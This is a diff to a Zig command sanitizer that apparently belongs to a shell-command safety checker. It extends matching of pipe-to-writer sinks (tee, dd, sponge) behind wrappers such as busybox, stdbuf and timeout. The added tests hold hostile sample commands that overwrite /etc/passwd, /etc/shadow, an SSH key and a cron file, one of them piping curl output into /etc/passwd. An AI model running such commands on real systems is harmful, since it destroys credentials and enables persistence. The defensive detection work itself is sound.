@@ -7,7 +7,7 @@ const std = @import("std");
 pub fn sanitizeForMatching(allocator: std.mem.Allocator, command: []const u8) ![]u8 {
     const needs = containsAnyWord(command, &[_][]const u8{
         "rg", "grep", "egrep", "fgrep", "ag", "ack", "echo", "printf",
-        "git", "sed", "awk", "cat", "head", "tail", "wc", "sort", "tee",
+        "git", "sed", "awk", "cat", "head", "tail", "wc", "sort", "tee", "sponge",
     }) or std.mem.indexOfScalar(u8, command, '#') != null;
     if (!needs) return try allocator.dupe(u8, command);
 
@@ -53,11 +53,45 @@ pub fn sanitizeForMatching(allocator: std.mem.Allocator, command: []const u8) ![
         return out;
     }
 
+    // Non-data-only producers (`curl|tee`, `yes|tee`, `sed|dd of=`) never enter
+    // the data-only arm; still rewrite pipe-to-writer sinks so packs that need a
+    // `> /path` shape (or benefit from path extraction) can match.
+    if (hasUnquotedPipeToWriter(out)) {
+        rewriteWriteSinksForPackMatch(out);
+    }
+
     // Long padding lines used in regex_worst_case corpus: if command is mostly
     // filler around a destructive phrase as data, leave as-is only for real exec.
     // Echo-with-padding is already handled by isDataOnlyCommand.
 
     return out;
+}
+
+/// True when `buf` has an unquoted `|` whose RHS simple-command is a known writer.
+fn hasUnquotedPipeToWriter(buf: []const u8) bool {
+    var i: usize = 0;
+    var in_single = false;
+    var in_double = false;
+    while (i < buf.len) : (i += 1) {
+        const c = buf[i];
+        if (c == '\\' and !in_single and i + 1 < buf.len) {
+            i += 1;
+            continue;
+        }
+        if (c == '\'' and !in_double) {
+            in_single = !in_single;
+            continue;
+        }
+        if (c == '"' and !in_single) {
+            in_double = !in_double;
+            continue;
+        }
+        if (in_single or in_double) continue;
+        if (c == '|' and !(i + 1 < buf.len and buf[i + 1] == '|')) {
+            if (pipeRhsIsWriter(buf, i + 1)) return true;
+        }
+    }
+    return false;
 }
 
 fn isDataOnlyCommand(cmd: []const u8) bool {
@@ -422,12 +456,11 @@ fn rewriteWriteSinksForPackMatch(buf: []u8) void {
     }
 }
 
-/// First absolute path token (`/…`) in `span`, excluding process-sub punctuation.
+/// First pack-visible path token (`/…`, `~…`, `$HOME…`) in `span`.
 fn firstAbsolutePath(span: []const u8) ?[]const u8 {
     var j: usize = 0;
     while (j < span.len) : (j += 1) {
-        if (span[j] != '/') continue;
-        // Skip `//` comments-like or empty; require a path segment char or end-ish.
+        if (!isPathShapedArgAt(span, j)) continue;
         var k = j + 1;
         while (k < span.len) {
             const c = span[k];
@@ -436,18 +469,17 @@ fn firstAbsolutePath(span: []const u8) ?[]const u8 {
                 break;
             k += 1;
         }
-        // `/` alone or `/etc/passwd` etc.
         if (k > j) return span[j..k];
     }
     return null;
 }
 
-/// `dd of=/path` or `of="/path"` form inside a pipe-to-dd stage.
+/// `dd of=/path` or `of="/path"` / `of=$HOME/...` form inside a pipe-to-dd stage.
 fn firstDdOfPath(span: []const u8) ?[]const u8 {
     const idx = std.mem.indexOf(u8, span, "of=") orelse return null;
     var j = idx + 3;
     if (j < span.len and (span[j] == '"' or span[j] == '\'')) j += 1;
-    if (j >= span.len or span[j] != '/') return null;
+    if (j >= span.len or !isPathShapedArgAt(span, j)) return null;
     var k = j + 1;
     while (k < span.len) {
         const c = span[k];
@@ -470,7 +502,7 @@ fn firstWriterSinkPath(span: []const u8) ?[]const u8 {
     if (j < span.len and span[j] == '|') j += 1;
     while (j < span.len and std.ascii.isWhitespace(span[j])) : (j += 1) {}
 
-    // Skip wrappers then the writer command word.
+    // Skip wrappers/flags then the writer command word.
     var saw_writer = false;
     while (j < span.len) {
         var end = j;
@@ -482,10 +514,25 @@ fn firstWriterSinkPath(span: []const u8) ?[]const u8 {
         const word = span[j..end];
         const base = basename(word);
         if (!saw_writer) {
-            if (std.mem.eql(u8, base, "env") or std.mem.eql(u8, base, "command") or
-                std.mem.eql(u8, base, "exec") or std.mem.eql(u8, base, "nice") or
-                std.mem.eql(u8, base, "nohup") or std.mem.eql(u8, base, "sudo"))
-            {
+            if (isWrapperBasename(base)) {
+                j = end;
+                while (j < span.len and std.ascii.isWhitespace(span[j])) : (j += 1) {}
+                // Skip ENV=val after env, and flags after stdbuf/timeout/etc.
+                while (j < span.len) {
+                    var k = j;
+                    while (k < span.len and !std.ascii.isWhitespace(span[k])) : (k += 1) {}
+                    const tok = span[j..k];
+                    if (tok.len > 0 and (tok[0] == '-' or std.mem.indexOfScalar(u8, tok, '=') != null)) {
+                        j = k;
+                        while (j < span.len and std.ascii.isWhitespace(span[j])) : (j += 1) {}
+                        continue;
+                    }
+                    break;
+                }
+                continue;
+            }
+            // Flags before writer (unusual but harmless): skip `-…`
+            if (word.len > 0 and word[0] == '-') {
                 j = end;
                 while (j < span.len and std.ascii.isWhitespace(span[j])) : (j += 1) {}
                 continue;
@@ -502,11 +549,11 @@ fn firstWriterSinkPath(span: []const u8) ?[]const u8 {
     }
     if (!saw_writer) return null;
 
-    // Remaining args: skip flags (`-a`, `--append`) then take first absolute path.
+    // Remaining args: skip flags (`-a`, `--append`) then take first path-shaped sink.
     while (j < span.len) {
         while (j < span.len and std.ascii.isWhitespace(span[j])) : (j += 1) {}
         if (j >= span.len) break;
-        if (span[j] == '-' ) {
+        if (span[j] == '-') {
             // Flag or `--`; skip this token.
             while (j < span.len and !std.ascii.isWhitespace(span[j])) : (j += 1) {}
             continue;
@@ -517,11 +564,11 @@ fn firstWriterSinkPath(span: []const u8) ?[]const u8 {
             j += 1;
             const start = j;
             while (j < span.len and span[j] != q) : (j += 1) {}
-            if (start < j and span[start] == '/') return span[start..j];
+            if (start < j and isPathShapedArg(span[start..j])) return span[start..j];
             if (j < span.len) j += 1;
             continue;
         }
-        if (span[j] == '/') {
+        if (isPathShapedArgAt(span, j)) {
             const start = j;
             while (j < span.len and !std.ascii.isWhitespace(span[j]) and span[j] != '|' and
                 span[j] != ';' and span[j] != '&')
@@ -533,6 +580,15 @@ fn firstWriterSinkPath(span: []const u8) ?[]const u8 {
         while (j < span.len and !std.ascii.isWhitespace(span[j])) : (j += 1) {}
     }
     return null;
+}
+
+/// True when `span[i..]` begins a path-shaped sink (`/…`, `~`, `$HOME`).
+fn isPathShapedArgAt(span: []const u8, i: usize) bool {
+    if (i >= span.len) return false;
+    if (span[i] == '/' or span[i] == '~') return true;
+    if (span[i] == '$' and i + 5 <= span.len and std.mem.startsWith(u8, span[i..], "$HOME")) return true;
+    if (span[i] == '$' and i + 6 <= span.len and std.mem.startsWith(u8, span[i..], "${HOME")) return true;
+    return false;
 }
 
 /// Write-side redirect only (`>`, `>>`, `>&`, `&>`, `>|`, optional fd). Excludes
@@ -654,12 +710,17 @@ fn balancedGroupEnd(buf: []const u8, open_at: usize, open_ch: u8, close_ch: u8) 
     return j;
 }
 
-/// True when an unquoted pipe RHS starts with a known write sink (tee/dd),
-/// optionally wrapped by sudo/env/command/nice/nohup/exec.
+/// True when an unquoted pipe RHS simple-command contains a known write sink
+/// (tee/dd/sponge), including after wrappers (`sudo`, `busybox`, `stdbuf`, …)
+/// and flags (`-oL`). Scans all argv words in the stage so `busybox tee` works.
 fn pipeRhsIsWriter(buf: []const u8, after_pipe: usize) bool {
     var j = after_pipe;
     while (j < buf.len and std.ascii.isWhitespace(buf[j])) : (j += 1) {}
     while (j < buf.len) {
+        if (buf[j] == '|' or buf[j] == ';' or buf[j] == '&' or buf[j] == '<' or buf[j] == '>') {
+            // End of this simple-command stage (except we started after `|`).
+            break;
+        }
         var end = j;
         while (end < buf.len and !std.ascii.isWhitespace(buf[end]) and buf[end] != '|' and
             buf[end] != ';' and buf[end] != '&' and buf[end] != '<' and buf[end] != '>')
@@ -669,33 +730,26 @@ fn pipeRhsIsWriter(buf: []const u8, after_pipe: usize) bool {
         const word = buf[j..end];
         const base = basename(word);
         if (isWriterBasename(base)) return true;
-        if (std.mem.eql(u8, base, "env") or std.mem.eql(u8, base, "command") or
-            std.mem.eql(u8, base, "exec") or std.mem.eql(u8, base, "nice") or
-            std.mem.eql(u8, base, "nohup") or std.mem.eql(u8, base, "sudo"))
-        {
-            j = end;
-            while (j < buf.len and std.ascii.isWhitespace(buf[j])) : (j += 1) {}
-            // Skip ENV=val for env
-            while (j < buf.len) {
-                var k = j;
-                while (k < buf.len and !std.ascii.isWhitespace(buf[k])) : (k += 1) {}
-                const tok = buf[j..k];
-                if (tok.len > 0 and std.mem.indexOfScalar(u8, tok, '=') != null) {
-                    j = k;
-                    while (j < buf.len and std.ascii.isWhitespace(buf[j])) : (j += 1) {}
-                    continue;
-                }
-                break;
-            }
-            continue;
-        }
-        return false;
+        // `dd of=/path` may appear as a single token.
+        if (std.mem.startsWith(u8, word, "of=") or std.mem.startsWith(u8, base, "of=")) return true;
+        j = end;
+        while (j < buf.len and std.ascii.isWhitespace(buf[j])) : (j += 1) {}
     }
     return false;
 }
 
+fn isWrapperBasename(base: []const u8) bool {
+    return std.mem.eql(u8, base, "env") or std.mem.eql(u8, base, "command") or
+        std.mem.eql(u8, base, "exec") or std.mem.eql(u8, base, "nice") or
+        std.mem.eql(u8, base, "nohup") or std.mem.eql(u8, base, "sudo") or
+        std.mem.eql(u8, base, "doas") or std.mem.eql(u8, base, "busybox") or
+        std.mem.eql(u8, base, "stdbuf") or std.mem.eql(u8, base, "timeout") or
+        std.mem.eql(u8, base, "ionice") or std.mem.eql(u8, base, "time");
+}
+
 fn isWriterBasename(base: []const u8) bool {
-    return std.mem.eql(u8, base, "tee") or std.mem.eql(u8, base, "dd");
+    return std.mem.eql(u8, base, "tee") or std.mem.eql(u8, base, "dd") or
+        std.mem.eql(u8, base, "sponge");
 }
 
 /// Exclusive end of the simple-command region starting at `start` (often `|`),
@@ -917,6 +971,35 @@ test "sanitize preserves tee absolute path argv for pack match" {
     const tmp = try sanitizeForMatching(std.testing.allocator, "tee /tmp/log");
     defer std.testing.allocator.free(tmp);
     try std.testing.expect(std.mem.indexOf(u8, tmp, "/tmp/log") != null);
+}
+
+test "sanitize preserves pipe-to-busybox/stdbuf/sponge writer sinks" {
+    const cases = [_][]const u8{
+        "echo pwn | busybox tee /etc/passwd",
+        "echo pwn | stdbuf -oL tee /etc/passwd",
+        "printf x | sponge /etc/shadow",
+        "echo x | timeout 5 tee /home/user/.ssh/id_rsa",
+    };
+    for (cases) |cmd| {
+        const s = try sanitizeForMatching(std.testing.allocator, cmd);
+        defer std.testing.allocator.free(s);
+        // Sensitive path must remain pack-visible (preserve and/or rewrite to `>`).
+        try std.testing.expect(std.mem.indexOf(u8, s, "/etc/") != null or
+            std.mem.indexOf(u8, s, "/home/") != null);
+    }
+}
+
+test "sanitize rewrites non-data-only pipe-to-tee for pack match" {
+    const cases = [_][]const u8{
+        "curl -s http://example/pwn | tee /etc/passwd",
+        "yes pwn | tee /etc/cron.d/x",
+    };
+    for (cases) |cmd| {
+        const s = try sanitizeForMatching(std.testing.allocator, cmd);
+        defer std.testing.allocator.free(s);
+        try std.testing.expect(std.mem.indexOf(u8, s, "/etc/") != null or
+            std.mem.indexOf(u8, s, ">") != null);
+    }
 }
 
 test "sanitize preserves search/git quoted write-redirect targets" {
